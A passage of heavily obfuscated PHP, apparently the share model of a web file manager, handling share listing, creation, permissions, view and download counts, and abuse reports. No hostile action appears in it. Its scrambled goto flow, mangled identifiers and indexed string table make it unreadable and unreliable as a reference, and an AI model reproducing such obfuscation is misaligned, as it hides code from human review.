Model($BÄ„¥©¦ŠÀ[449])->authMake($Aš±ÔÌ½ò»[$BÄ„¥©¦ŠÀ[2178]]); return $Aš±ÔÌ½ò»; } protected function listData($cÖ©¡¤†¾õ = null, $c«ç¼Èõéæ = 300) { $Eñ°éŠœ…© =& $_SERVER[õëù©û]; $Fò¸ÕÊ‹¨” = array(array($Eñ°éŠœ…©[441] => array($Eñ°éŠœ…©[919], 0), $Eñ°éŠœ…©[443] => array($Eñ°éŠœ…©[919], 0), $Eñ°éŠœ…©[2179] => $Eñ°éŠœ…©[2148])); if ($cÖ©¡¤†¾õ == $Eñ°éŠœ…©[1835]) { $Fò¸ÕÊ‹¨” = array($Eñ°éŠœ…©[441] => 1); } else { if ($cÖ©¡¤†¾õ == $Eñ°éŠœ…©[998]) { $Fò¸ÕÊ‹¨” = array($Eñ°éŠœ…©[443] => 1); } } $Fò¸ÕÊ‹¨”[$Eñ°éŠœ…©[1404]] = USER_ID; $f—Â˜¡È÷İ = $this->where($Fò¸ÕÊ‹¨”)->selectPage($c«ç¼Èõéæ); return $f—Â˜¡È÷İ; } protected function listToMe($F¢»ˆÒÊ‰å = 300) { goto f”—ô‰Ğò£; D·ˆ•ÆÓ: $eñ”Ş…§¤ñ = array_to_keyvalue_group($D ´ó£®¯œ[$D‹‰ùèùš‰[350]], $D‹‰ùèùš‰[436]); if (!$eñ”Ş…§¤ñ) { return $D ´ó£®¯œ; } $F´¤Ø§Ò˜ = $D‹‰ùèùš‰[2181]; goto Eä”Ïï® ; aˆÅ±Îœ•: $A¶ßõ’‚õ­ = array($D‹‰ùèùš‰[516] => SourceModel::TYPE_USER, $D‹‰ùèùš‰[451] => USER_ID); if ($DèÊÉîÛ) { $A¶ßõ’‚õ­ = array(array($D‹‰ùèùš‰[516] => SourceModel::TYPE_USER, $D‹‰ùèùš‰[451] => USER_ID), array($D‹‰ùèùš‰[516] => SourceModel::TYPE_GROUP, $D‹‰ùèùš‰[451] => array($D‹‰ùèùš‰[7], $DèÊÉîÛ)), $D‹‰ùèùš‰[2179] => $D‹‰ùèùš‰[2148]); } $D ´ó£®¯œ = Model($D‹‰ùèùš‰[532])->where($A¶ßõ’‚õ­)->selectPage($F¢»ˆÒÊ‰å); goto D·ˆ•ÆÓ; f”—ô‰Ğò£: $D‹‰ùèùš‰ =& $_SERVER[õëù©û]; $A¸®–ƒŠÕÜ = Session::get($D‹‰ùèùš‰[2180]); $DèÊÉîÛ = array_to_keyvalue($A¸®–ƒŠÕÜ, $D‹‰ùèùš‰[33], $D‹‰ùèùš‰[2068]); goto aˆÅ±Îœ•; e¥ÀªÙÀ©—: $b›åÑ™À¸ò = array($D‹‰ùèùš‰[2182] => $d‘ÈòÔ²„ß, $D‹‰ùèùš‰[2183] => $D ´ó£®¯œ[$D‹‰ùèùš‰[347]]); return $b›åÑ™À¸ò; goto d†”ÂËñç´; Eä”Ïï® : $A¶ßõ’‚õ­ = array($D‹‰ùèùš‰[436] => array($D‹‰ùèùš‰[380], array_keys($eñ”Ş…§¤ñ))); $d‘ÈòÔ²„ß = $this->field($F´¤Ø§Ò˜)->where($A¶ßõ’‚õ­)->select(); foreach ($d‘ÈòÔ²„ß as $f˜õÈ¬Õğ† => &$f¿â·¾ë£î) { $f¿â·¾ë£î[$D‹‰ùèùš‰[2178]] = $eñ”Ş…§¤ñ[$f¿â·¾ë£î[$D‹‰ùèùš‰[436]]]; } goto e¥ÀªÙÀ©—; d†”ÂËñç´: } protected function shareAdd($f£è£Ü‘¦, $F‰Øèø³âÈ) { $c©´¼Îó´· =& $_SERVER[õëù©û]; $Bœ“âª¯ß® = $this->_addShareData($f£è£Ü‘¦, $F‰Øèø³âÈ); if (!empty($F‰Øèø³âÈ[$c©´¼Îó´·[2184]])) { $this->_shareAuthSet($Bœ“âª¯ß®, $F‰Øèø³âÈ[$c©´¼Îó´·[2184]]); } $this->shareEventAdd($f£è£Ü‘¦, $F‰Øèø³âÈ, $c©´¼Îó´·[1001]); return $Bœ“âª¯ß®; } private function shareEventAdd($CÍøÇÑŒˆ, $F”ˆÖà ôÔ, $FŸ¤ÑëÏ–· = "\x61\144\x64") { goto aÓõŒƒÁ¶; F”Óœí—ƒ: return; goto A×®ÊÃÖ´ñ; aÓõŒƒÁ¶: $AÌÖ‡š‹¡¿ =& $_SERVER[õëù©û]; if ($FŸ¤ÑëÏ–· == $AÌÖ‡š‹¡¿[1001]) { if ($F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[441]] == $AÌÖ‡š‹¡¿[83]) { Model($AÌÖ‡š‹¡¿[500])->eventShare($CÍøÇÑŒˆ, $AÌÖ‡š‹¡¿[2185]); } if ($F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[443]] == $AÌÖ‡š‹¡¿[83]) { Model($AÌÖ‡š‹¡¿[500])->eventShare($CÍøÇÑŒˆ, $AÌÖ‡š‹¡¿[2186]); } return; } $BÍèÉÖ³× = $this->getInfoByPath($CÍøÇÑŒˆ); goto B°‡ô«º®; B°‡ô«º®: $e±¨˜ÔïÊ = $AÌÖ‡š‹¡¿[2187]; if ($BÍèÉÖ³×[$AÌÖ‡š‹¡¿[441]] == $AÌÖ‡š‹¡¿[463] && $F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[441]] == $AÌÖ‡š‹¡¿[83]) { $e±¨˜ÔïÊ = $AÌÖ‡š‹¡¿[2185]; } if ($BÍèÉÖ³×[$AÌÖ‡š‹¡¿[441]] == $AÌÖ‡š‹¡¿[83] && $F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[441]] == $AÌÖ‡š‹¡¿[463]) { $e±¨˜ÔïÊ = $AÌÖ‡š‹¡¿[2188]; } goto Dë‹»¢‘™”; Dë‹»¢‘™”: if ($BÍèÉÖ³×[$AÌÖ‡š‹¡¿[443]] == $AÌÖ‡š‹¡¿[463] && $F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[443]] == $AÌÖ‡š‹¡¿[83]) { $e±¨˜ÔïÊ = $AÌÖ‡š‹¡¿[2186]; } if ($BÍèÉÖ³×[$AÌÖ‡š‹¡¿[443]] == $AÌÖ‡š‹¡¿[83] && $F”ˆÖà ôÔ[$AÌÖ‡š‹¡¿[443]] == $AÌÖ‡š‹¡¿[463]) { $e±¨˜ÔïÊ = $AÌÖ‡š‹¡¿[2189]; } Model($AÌÖ‡š‹¡¿[500])->eventShare($CÍøÇÑŒˆ, $e±¨˜ÔïÊ); goto F”Óœí—ƒ; A×®ÊÃÖ´ñ: } private function _addShareData($f°øï´Àâ, $fî‚ÈÄ‘Â = array()) { goto EòØ‡²§…Œ; B‰ñöù¦ğ¿: return $cÕµáä™á; goto eî®ˆÑãº’; DŒ×Ô”»ßì: $b´àÊ‚Ÿ¸‰ = array($C„äÁŒŞ ·[1395] => USER_ID, $C„äÁŒŞ ·[379] => $f°øï´Àâ, $C„äÁŒŞ ·[1310] => $C„äÁŒŞ ·[33], $C„äÁŒŞ ·[441] => 0, $C„äÁŒŞ ·[443] => 0, $C„äÁŒŞ ·[1009] => $C„äÁŒŞ ·[33], $C„äÁŒŞ ·[291] => $C„äÁŒŞ ·[33], $C„äÁŒŞ ·[795] => $C„äÁŒŞ ·[33], $C„äÁŒŞ ·[2191] => 0, $C„äÁŒŞ ·[2192] => 0, $C„äÁŒŞ ·[698] => 0, $C„äÁŒŞ ·[2193] => $C„äÁŒŞ ·[33], $C„äÁŒŞ ·[438] => $C„äÁŒŞ ·[33]); $Câ¼™¬ãÁê = explode($C„äÁŒŞ ·[47], $C„äÁŒŞ ·[2194]); foreach ($Câ¼™¬ãÁê as $AÚ¹Õ‘Â´) { if (!isset($fî‚ÈÄ‘Â[$AÚ¹Õ‘Â´])) { continue; } $b´àÊ‚Ÿ¸‰[$AÚ¹Õ‘Â´] = $fî‚ÈÄ‘Â[$AÚ¹Õ‘Â´]; } goto c³ÂÏö¦§Ë; EòØ‡²§…Œ: $C„äÁŒŞ · =& $_SERVER[õëù©û]; $dğÅâ†’É = array($C„äÁŒŞ ·[379] => $f°øï´Àâ, $C„äÁŒŞ ·[1395] => USER_ID); if ($f°øï´Àâ == 0) { $dğÅâ†’É = array($C„äÁŒŞ ·[2190] => $fî‚ÈÄ‘Â[$C„äÁŒŞ ·[1009]], $C„äÁŒŞ ·[1395] => USER_ID); } goto Aè•Œšñà‚; Aè•Œšñà‚: if ($dÖ¸¢²Ø÷œ = $this->where($dğÅâ†’É)->find()) { return $dÖ¸¢²Ø÷œ[$C„äÁŒŞ ·[436]]; } if ($f°øï´Àâ == 0) { $f¼Šì„¡ã“ = array($C„äÁŒŞ ·[28] => get_path_this($fî‚ÈÄ‘Â[$C„äÁŒŞ ·[75]])); } else { $f¼Šì„¡ã“ = Model($C„äÁŒŞ ·[747])->sourceInfo($f°øï´Àâ); if (!$f¼Šì„¡ã“) { return !1; } } if (!$fî‚ÈÄ‘Â[$C„äÁŒŞ ·[1310]]) { $fî‚ÈÄ‘Â[$C„äÁŒŞ ·[1310]] = $f¼Šì„¡ã“[$C„äÁŒŞ ·[28]]; } goto DŒ×Ô”»ßì; c³ÂÏö¦§Ë: $cÕµáä™á = $this->add($b´àÊ‚Ÿ¸‰); $B’ó½Å‰Š = array($C„äÁŒŞ ·[438] => short_id($cÕµáä™á)); $this->where(array($C„äÁŒŞ ·[435] => $cÕµáä™á))->save($B’ó½Å‰Š); goto B‰ñöù¦ğ¿; eî®ˆÑãº’: } private function _shareAuthSet($A¬”¨¹ù‹’, $d„¾×¡äá­) { goto Añö¹ä††; Añö¹ä††: $fİï¯…Ø‹¢ =& $_SERVER[õëù©û]; if (!is_array($d„¾×¡äá­)) { return !1; } $Dç¸Ú§Ï‹ = Model($fİï¯…Ø‹¢[2195]); goto a×±ªŠ’Ú; FÉ·Ñùéœ: return $Dç¸Ú§Ï‹->addAll($eŠÚÍÉ¢’, array(), !0); goto f‡¾ó¿ƒÆù; a×±ªŠ’Ú: $Dç¸Ú§Ï‹->where(array($fİï¯…Ø‹¢[436] => $A¬”¨¹ù‹’))->delete(); $eŠÚÍÉ¢’ = array(); foreach ($d„¾×¡äá­ as $bÈ›’·°Ÿ) { $C¸²Üƒ“¯ = SourceModel::TYPE_USER; if ($bÈ›’·°Ÿ[$fİï¯…Ø‹¢[367]] == SourceModel::TYPE_GROUP) { $C¸²Üƒ“¯ = SourceModel::TYPE_GROUP; } $DÃ­ïšÆµé = array($fİï¯…Ø‹¢[436] => $A¬”¨¹ù‹’, $fİï¯…Ø‹¢[367] => $C¸²Üƒ“¯, $fİï¯…Ø‹¢[451] => intval($bÈ›’·°Ÿ[$fİï¯…Ø‹¢[451]]), $fİï¯…Ø‹¢[2196] => 0, $fİï¯…Ø‹¢[2197] => -1); if ($bÈ›’·°Ÿ[$fİï¯…Ø‹¢[2196]]) { $DÃ­ïšÆµé[$fİï¯…Ø‹¢[2196]] = $bÈ›’·°Ÿ[$fİï¯…Ø‹¢[2196]]; } else { if ($bÈ›’·°Ÿ[$fİï¯…Ø‹¢[2197]]) { $DÃ­ïšÆµé[$fİï¯…Ø‹¢[2197]] = $bÈ›’·°Ÿ[$fİï¯…Ø‹¢[2197]]; } } $eŠÚÍÉ¢’[] = $DÃ­ïšÆµé; } goto FÉ·Ñùéœ; f‡¾ó¿ƒÆù: } public function numViewAdd($F‡ÁîµÏŠÔ) { $eø¿çÖ†ô =& $_SERVER[õëù©û]; $E¥ŞĞñõ®ã = array($eø¿çÖ†ô[435] => $F‡ÁîµÏŠÔ); $this->where($E¥ŞĞñõ®ã)->setAdd($eø¿çÖ†ô[2191]); } public function numDownloadAdd($cæéÌ´®Æ¶) { $bÒŒŒ“£«¸ =& $_SERVER[õëù©û]; $eù‰ÚÎêİ = array($bÒŒŒ“£«¸[435] => $cæéÌ´®Æ¶); $this->where($eù‰ÚÎêİ)->setAdd($bÒŒŒ“£«¸[2192]); } protected function shareEdit($B·âò³†Ê, $f¥çµ¢¥ò) { goto cÈ¢ ÚéÛ; c°ÓãÁ…­±: $this->_checkLinkShare($f¥çµ¢¥ò, $e÷Şå—Øš‰); $aÏÊäøÔÒƒ = array(); $a”¼ÂáŞÊ§ = explode($e­¬Ü–«ÊÚ[47], $e­¬Ü–«ÊÚ[2198]); goto A±÷ÛÒ¤»Ò; DˆäÖ¯í: if (isset($f¥çµ¢¥ò[$e­¬Ü–«ÊÚ[2184]])) { $this->_shareAuthSet($B·âò³†Ê, $f¥çµ¢¥ò[$e­¬Ü–«ÊÚ[2184]]); } return !0; goto Bæò˜‹·ŞÌ; cÈ¢ ÚéÛ: $e­¬Ü–«ÊÚ =& $_SERVER[õëù©û]; $e÷Şå—Øš‰ = $this->getInfo($B·âò³†Ê); if (!$e÷Şå—Øš‰) { return !1; } goto c°ÓãÁ…­±; A±÷ÛÒ¤»Ò: foreach ($a”¼ÂáŞÊ§ as $a’¨°İÓ°¸) { if (!array_key_exists($a’¨°İÓ°¸, $f¥çµ¢¥ò)) { continue; } $aÏÊäøÔÒƒ[$a’¨°İÓ°¸] = $f¥çµ¢¥ò[$a’¨°İÓ°¸]; } $this->shareEventAdd($e÷Şå—Øš‰[$e­¬Ü–«ÊÚ[365]], $f¥çµ¢¥ò, $e­¬Ü–«ÊÚ[2036]); $this->where(array($e­¬Ü–«ÊÚ[435] => $B·âò³†Ê))->save($aÏÊäøÔÒƒ); goto DˆäÖ¯í; Bæò˜‹·ŞÌ: } private function _checkLinkShare($Cƒ‡Ñºãéİ, $fÒ‡‡öËÚ¾) { goto D°ù®‰êÑ«; fŠ††˜—¢ô: if ($fÒ‡‡öËÚ¾[$F¢¨‰›¯Œ±[387]][$F¢¨‰›¯Œ±[29]] != $F¢¨‰›¯Œ±[163]) { $C›«’ò…Ö¢ = $this->_folderReport($AŠÛ©šİ¡È); if (!$C›«’ò…Ö¢) { return; } show_json(LNG($F¢¨‰›¯Œ±[2199]) . $F¢¨‰›¯Œ±[2200] . $C›«’ò…Ö¢, !1); } $b‚©ŒË¤ô = Model($F¢¨‰›¯Œ±[747])->fileInfoGet($fÒ‡‡öËÚ¾[$F¢¨‰›¯Œ±[387]][$F¢¨‰›¯Œ±[365]]); if (!$b‚©ŒË¤ô) { return; } goto D„ãÅêŒØ’; D„ãÅêŒØ’: $E˜¼·÷œœÍ = $this->shareFileMeta($b‚©ŒË¤ô[$F¢¨‰›¯Œ±[414]]); if (isset($E˜¼·÷œœÍ[$F¢¨‰›¯Œ±[355]]) && $E˜¼·÷œœÍ[$F¢¨‰›¯Œ±[355]] == $F¢¨‰›¯Œ±[83]) { show_json(LNG($F¢¨‰›¯Œ±[2201]), !1); } goto aÛšË„™²¾; D°ù®‰êÑ«: $F¢¨‰›¯Œ± =& $_SERVER[õëù©û]; if ($Cƒ‡Ñºãéİ[$F¢¨‰›¯Œ±[441]] != $F¢¨‰›¯Œ±[83]) { return; } $AŠÛ©šİ¡È = $fÒ‡‡öËÚ¾[$F¢¨‰›¯Œ±[387]][$F¢¨‰›¯Œ±[365]]; goto fŠ††˜—¢ô; aÛšË„™²¾: } private function _folderReport($d»¥Û÷©ËÈ) { goto bç·ÎÒ‹Ñƒ; bç·ÎÒ‹Ñƒ: $Fïôîò¯˜ =& $_SERVER[õëù©û]; $Eæ¯›Û†…² = array($Fïôîò¯˜[414] => array($Fïôîò¯˜[919], 0), $Fïôîò¯˜[684] => 3); $d‘”½´›´Ô = Model($Fïôîò¯˜[2202])->where($Eæ¯›Û†…²)->field($Fïôîò¯˜[414])->select(); goto BöâêšìÊ; fæ˜Ñ¡É‚: $b½Æµ…•İ = substr($BŒĞ¾×ÙÁ[$Fïôîò¯˜[454]], strpos($BŒĞ¾×ÙÁ[$Fïôîò¯˜[454]], $dâ‡³ã„‘¨)); $Eæ¯›Û†…² = array($Fïôîò¯˜[365] => array($Fïôîò¯˜[7], trim($b½Æµ…•İ, $Fïôîò¯˜[47]))); $CëÇâ†¤†æ = Model($Fïôîò¯˜[747])->where($Eæ¯›Û†…²)->field($Fïôîò¯˜[28])->select(); goto CŒª‘´Š›•; AœÜí×‡ÓÆ: $Eæ¯›Û†…² = array($Fïôîò¯˜[414] => array($Fïôîò¯˜[7], $d‘”½´›´Ô), $Fïôîò¯˜[454] => array($Fïôîò¯˜[746], "\x25{$dâ‡³ã„‘¨}\x25"), $Fïôîò¯˜[392] => 0); $BŒĞ¾×ÙÁ = Model($Fïôîò¯˜[747])->where($Eæ¯›Û†…²)->field($Fïôîò¯˜[2203])->find(); if (!$BŒĞ¾×ÙÁ) { return !1; } goto fæ˜Ñ¡É‚; BöâêšìÊ: if (!$d‘”½´›´Ô) { return !1; } $d‘”½´›´Ô = array_to_keyvalue($d‘”½´›´Ô, $Fïôîò¯˜[33], $Fïôîò¯˜[414]); $dâ‡³ã„‘¨ = $Fïôîò¯˜[47] . $d»¥Û÷©ËÈ . $Fïôîò¯˜[47]; goto AœÜí×‡ÓÆ; CŒª‘´Š›•: $Bä±°¿·®ƒ = array_to_keyvalue($CëÇâ†¤†æ, $Fïôîò¯˜[33], $Fïôîò¯˜[28]); $Bä±°¿·®ƒ[] = $BŒĞ¾×ÙÁ[$Fïôîò¯˜[28]]; return implode($Fïôîò¯˜[8], $Bä±°¿·®ƒ); goto f•¦”ë‰’Ñ; f•¦”ë‰’Ñ: } protected function remove($b«¯…ë¹’) { goto CËå‘Öê¸ø; eó‹Í²÷•: $AÈ«„ó²à† = $this->where($Açœ˜Ø„¿ì)->delete(); if ($AÈ«„ó²à†) { Model($B ¸Ÿ…ÎÉ[532])->where(array($B ¸Ÿ…ÎÉ[436] => $b«¯…ë¹’))->delete(); } $bÌÏ‘Š¦ñ = is_array($b«¯…ë¹’) ? $b«¯…ë¹’[1] : array($b«¯…ë¹’); goto Aºß»÷Ÿ§¡; CËå‘Öê¸ø: $B ¸Ÿ…ÎÉ =& $_SERVER[õëù©û]; if (is_array($b«¯…ë¹’)) { $b«¯…ë¹’ = array($B ¸Ÿ…ÎÉ[7], $b«¯…ë¹’); } $Açœ˜Ø„¿ì = array($B ¸Ÿ…ÎÉ[436] => $b«¯…ë¹’); goto eó‹Í²÷•; Aºß»÷Ÿ§¡: for ($Dì§¾ù±ö = 0; $Dì§¾ù±ö < count($bÌÏ‘Š¦ñ); $Dì§¾ù±ö++) { $aæÁæ÷‹³ = $this->getInfo($bÌÏ‘Š¦ñ[$Dì§¾ù±ö]); if ($aæÁæ÷‹³[$B ¸Ÿ…ÎÉ[443]] == $B ¸Ÿ…ÎÉ[83]) { Model($B ¸Ÿ…ÎÉ[500])->eventShare($aæÁæ÷‹³[$B ¸Ÿ…ÎÉ[365]], $B ¸Ÿ…ÎÉ[2189]); } if ($aæÁæ÷‹³[$B ¸Ÿ…ÎÉ[441]] == $B ¸Ÿ…ÎÉ[83]) { Model($B ¸Ÿ…ÎÉ[500])->eventShare($aæÁæ÷‹³[$B ¸Ÿ…ÎÉ[365]], $B ¸Ÿ…ÎÉ[2188]); } } return $AÈ«„ó²à†; goto AÇ“¨Ïë¶; AÇ“¨Ïë¶: } protected function removeBySource($FÀëèìŠçù) { goto dÜ·ÌÏ…°Â; dÜ·ÌÏ…°Â: $dØê±ÀÂ¹° =& $_SERVER[õëù©û]; $d˜Óƒ…Õ = array($dØê±ÀÂ¹°[379] => array($dØê±ÀÂ¹°[380], $FÀëèìŠçù)); $C„«Éö„Ñ² = $this->field($dØê±ÀÂ¹°[436])->where($d˜Óƒ…Õ)->select(); goto bõ­·„ÓˆÅ; bÓçÌ°ƒŠè: $this->where($d˜Óƒ…Õ)->delete(); Model($dØê±ÀÂ¹°[532])->where($d˜Óƒ…Õ)->delete(); goto eö¢š°¢›”; bõ­·„ÓˆÅ: $C„«Éö„Ñ² = array_to_keyvalue($C„«Éö„Ñ², $dØê±ÀÂ¹°[33], $dØê±ÀÂ¹°[436]); if (!$C„«Éö„Ñ²) { return; } $d˜Óƒ…Õ = array($dØê±ÀÂ¹°[435] => array($dØê±ÀÂ¹°[380], $C„«Éö„Ñ²)); goto bÓçÌ°ƒŠè; eö¢š°¢›”: } public function listAll($dµîààÅœæ) { goto e£»•õŒ©§; b¤ñéË§Ñ²: if ($dµîààÅœæ[$dÈµ·Àù›´[697]]) { $f¸ÇÊï¾ç = $dµîààÅœæ[$dÈµ·Àù›´[698]] ? $dµîààÅœæ[$dÈµ·Àù›´[698]] : strtotime(date($dÈµ·Àù›´[2204])); $fÆ›ô§¹†[$dÈµ·Àù›´[183]] = array($dÈµ·Àù›´[317], array($dµîààÅœæ[$dÈµ·Àù›´[697]], $f¸ÇÊï¾ç)); } if ($dµîààÅœæ[$dÈµ·Àù›´[29]]) { $fÆ›ô§¹†[$dµîààÅœæ[$dÈµ·Àù›´[29]]] = 1; } else { $fÆ›ô§¹†[] = array($dÈµ·Àù›´[441] => array($dÈµ·Àù›´[919], 0), $dÈµ·Àù›´[443] => array($dÈµ·Àù›´[919], 0), $dÈµ·Àù›´[2179] => $dÈµ·Àù›´[2148]); } if ($dµîààÅœæ[$dÈµ·Àù›´[2144]]) { $fÆ›ô§¹†[] = array($dÈµ·Àù›´[438] => $dµîààÅœæ[$dÈµ·Àù›´[2144]], $dÈµ·Àù›´[1310] => array($dÈµ·Àù›´[746], "\x25{$dµîààÅœæ[$dÈµ·Àù›´[2144]]}\x25"), $dÈµ·Àù›´[2179] => $dÈµ·Àù›´[2148]); } goto Bµ‚ß˜ºß; e£»•õŒ©§: $dÈµ·Àù›´ =& $_SERVER[õëù©û]; $fÆ›ô§¹† = array(); if ($dµîààÅœæ[$dÈµ·Àù›´[1404]]) { $fÆ›ô§¹†[$dÈµ·Àù›´[1404]] = $dµîààÅœæ[$dÈµ·Àù›´[1404]]; } goto b¤ñéË§Ñ²; Bµ‚ß˜ºß: $c®Şää«‹ã = $this->_makeOrder()->where($fÆ›ô§¹†)->selectPage(20); if (empty($c®Şää«‹ã[$dÈµ·Àù›´[350]])) { return array(); } $this->_listDataApply($c®Şää«‹ã[$dÈµ·Àù›´[350]]); goto bó®¨®ò·ê; bó®¨®ò·ê: return $c®Şää«‹ã; goto AÕôËî¼«Ä; AÕôËî¼«Ä: } public function listDataApply($E¨ƒà·ê¸î) { $this->_listDataApply($E¨ƒà·ê¸î); return $E¨ƒà·ê¸î; } private function _listDataApply(&$C¸’Ã«„Ì) { $d”Œß„”› =& $_SERVER[õëù©û]; $bÕ×•´è‡Ÿ = array_to_keyvalue($C¸’Ã«„Ì, $d”Œß„”›[33], $d”Œß„”›[1404]); $dÏ Ü‹‰â² = Model($d”Œß„”›[472])->userListInfo(array_unique($bÕ×•´è‡Ÿ)); $F¹ŸÒ“ØÑ = array_to_keyvalue($C¸’Ã«„Ì, $d”Œß„”›[33], $d”Œß„”›[365]); $cõíí“âğ = Model($d”Œß„”›[747])->sourceListInfo($F¹ŸÒ“ØÑ, !0); foreach ($C¸’Ã«„Ì as &$CÎæŸñøè) { $dÙÍËŸ°ÚÕ = $CÎæŸñøè[$d”Œß„”›[1404]]; $CÎæŸñøè[$d”Œß„”›[2205]] = $dÏ Ü‹‰â²[$dÙÍËŸ°ÚÕ] ? $dÏ Ü‹‰â²[$dÙÍËŸ°ÚÕ] : !1; $F¥—İî„‚ø = $CÎæŸñøè[$d”Œß„”›[365]]; $CÎæŸñøè[$d”Œß„”›[387]] = $cõíí“âğ[$F¥—İî„‚ø] ? $cõíí“âğ[$F¥—İî„‚ø] : !1; } } private function _makeOrder($C»¢«··‘ñ = '') { goto F‡–º„š‹í; dŠÒÚ¨«åç: $CÅÏÙ¦Û·“ = Input::get($Cœ¬êß”‘[402], $Cœ¬êß”‘[7], $Cœ¬êß”‘[385], $Aë²À‹¥ƒƒ); $eÛÖâŞï¾ = Input::get($Cœ¬êß”‘[403], $Cœ¬êß”‘[7], $Cœ¬êß”‘[2206], array($Cœ¬êß”‘[2143], $Cœ¬êß”‘[399])); $eÛÖâŞï¾ = $DïëÖ—â°‹[$eÛÖâŞï¾]; goto CÜöµ§øİ; CÜöµ§øİ: $C»¢«··‘ñ = $C»¢«··‘ñ . "{$CÅÏÙ¦Û·“}\40{$eÛÖâŞï¾}"; return $this->order($C»¢«··‘ñ); goto C¥¬§óõÁ©; F‡–º„š‹í: $Cœ¬êß”‘ =& $_SERVER[õëù©û]; $Aë²À‹¥ƒƒ = array($Cœ¬êß”‘[183], $Cœ¬êß”‘[698], $Cœ¬êß”‘[2191], $Cœ¬êß”‘[2192]); $DïëÖ—â°‹ = array($Cœ¬êß”‘[397] => $Cœ¬êß”‘[398], $Cœ¬êß”‘[399] => $Cœ¬êß”‘[400]); goto dŠÒÚ¨«åç; C¥¬§óõÁ©: } public function reportAdd($fºÆá‹Ú„¤) { $EØ¼èóÏ¯™ =& $_SERVER[õëù©û]; $Cíµ¢É…· = array($EØ¼èóÏ¯™[436] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[436]], $EØ¼èóÏ¯™[1404] => USER_ID); if (Model($EØ¼èóÏ¯™[2202])->where($Cíµ¢É…·)->find()) { return !1; } $bŒ§ÇÏ­Ôî = array($EØ¼èóÏ¯™[436] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[436]], $EØ¼èóÏ¯™[1310] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[1310]], $EØ¼èóÏ¯™[365] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[365]], $EØ¼èóÏ¯™[414] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[414]], $EØ¼èóÏ¯™[1404] => USER_ID, $EØ¼èóÏ¯™[29] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[29]], $EØ¼èóÏ¯™[400] => $fºÆá‹Ú„¤[$EØ¼èóÏ¯™[400]]); return Model($EØ¼èóÏ¯™[2202])->add($bŒ§ÇÏ­Ôî); } public function reportList($EÚñÚŞ Ï‘) { goto bùİÆÓ¬¾‡; d–ÓğßÓ: if (empty($d¬ìß³®š[$càÒ÷èµˆ³[350]])) { return array(); } $this->_listDataApply($d¬ìß³®š[$càÒ÷èµˆ³[350]]); return $d¬ìß³®š; goto AÇğ“–¿é; A÷ËÃ°¤Î¢: if (isset($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[29]]) && in_array($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[29]], array($càÒ÷èµˆ³[83], $càÒ÷èµˆ³[2207], $càÒ÷èµˆ³[2208], $càÒ÷èµˆ³[2209], $càÒ÷èµˆ³[1884]))) { $EšËÑ†à[$càÒ÷èµˆ³[29]] = $EÚñÚŞ Ï‘[$càÒ÷èµˆ³[29]]; } if (isset($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[684]]) && in_array($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[684]], array($càÒ÷èµˆ³[463], $càÒ÷èµˆ³[83], $càÒ÷èµˆ³[2207], $càÒ÷èµˆ³[2208]))) { $EšËÑ†à[$càÒ÷èµˆ³[684]] = $EÚñÚŞ Ï‘[$càÒ÷èµˆ³[684]]; } $C¿‡†½›Òë = Input::get($càÒ÷èµˆ³[403], $càÒ÷èµˆ³[7], $càÒ÷èµˆ³[2206], array($càÒ÷èµˆ³[2143], $càÒ÷èµˆ³[399])); goto D¦â–­œ¾Ú; D¦â–­œ¾Ú: $bœ±å¼ÖÂ® = array($càÒ÷èµˆ³[397] => $càÒ÷èµˆ³[398], $càÒ÷èµˆ³[399] => $càÒ÷èµˆ³[400]); $bÓÙ®§‰×Õ = $càÒ÷èµˆ³[2210] . $bœ±å¼ÖÂ®[$C¿‡†½›Òë]; $d¬ìß³®š = Model($càÒ÷èµˆ³[2202])->where($EšËÑ†à)->order($bÓÙ®§‰×Õ)->selectPage(20); goto d–ÓğßÓ; bùİÆÓ¬¾‡: $càÒ÷èµˆ³ =& $_SERVER[õëù©û]; $EšËÑ†à = array(); if ($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[697]]) { $dÜ§å˜•¶ = $EÚñÚŞ Ï‘[$càÒ÷èµˆ³[698]] ? $EÚñÚŞ Ï‘[$càÒ÷èµˆ³[698]] : strtotime(date($càÒ÷èµˆ³[2204])); $EšËÑ†à[$càÒ÷èµˆ³[183]] = array($càÒ÷èµˆ³[317], array($EÚñÚŞ Ï‘[$càÒ÷èµˆ³[697]], $dÜ§å˜•¶)); } goto A÷ËÃ°¤Î¢; AÇğ“–¿é: } public function reportStatus($C‡‚Ö‘¨¶) { goto fô²ÎíÔ—÷; ašÑŠŞÄÏÜ: if (!$bêàÀƒ¼Óë) { return !1; } $FÉ³ÔŠÇ«„ = array($e¼©ƒš‡×[684] => $C‡‚Ö‘¨¶[$e¼©ƒš‡×[684]]); if ($C‡‚Ö‘¨¶[$e¼©ƒš‡×[684]] == $e¼©ƒš‡×[2208] && $bêàÀƒ¼Óë[$e¼©ƒš‡×[684]] == $e¼©ƒš‡×[2208]) { $FÉ³ÔŠÇ«„[$e¼©ƒš‡×[684]] = 0; } goto Dã„¶…øœ; Dã„¶…øœ: $BšéË‹Å¤¤ = Model($e¼©ƒš‡×[2202])->where($D…ÔÙÖªô†)->save($FÉ³ÔŠÇ«„); if ($C‡‚Ö‘¨¶[$e¼©ƒš‡×[684]] == $e¼©ƒš‡×[2207]) { if ($bêàÀƒ¼Óë[$e¼©ƒš‡×[414]] != $e¼©ƒš‡×[463] && $this->shareFileMeta($bêàÀƒ¼Óë[$e¼©ƒš‡×[414]])) { $this->shareFileMeta($bêàÀƒ¼Óë[$e¼©ƒš‡×[414]], 0); } return $this->remove($bêàÀƒ¼Óë[$e¼©ƒš‡×[436]]); } if ($BšéË‹Å¤¤ && $C‡‚Ö‘¨¶[$e¼©ƒš‡×[684]] == $e¼©ƒš‡×[2208]) { $Eê³½Ööäá = 